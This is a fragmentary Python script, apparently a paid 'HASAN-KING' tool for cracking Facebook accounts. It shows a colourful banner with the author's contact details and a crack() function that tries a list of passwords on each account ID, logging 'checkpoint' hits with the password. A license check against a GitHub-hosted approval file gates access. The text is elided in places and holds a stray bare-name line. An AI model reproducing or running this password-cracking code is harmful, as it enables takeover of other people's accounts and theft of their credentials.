...
os.system('espeak  " Welcome,   to,  HASAN-KING,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38m HASAN-KING ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • UPDATE.DARK.CYBER.BD71 ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m FUCK-BD71 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01944408580 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[HASAN-KING-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				JIBON
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•JIBON-Cp] {idf} • {pw}')     
				os.system('espeak  " C,  P"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/FUCK-BD71/Approval.txt/tree/main/1.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HASAN-KING, ToOLs Daily Update")
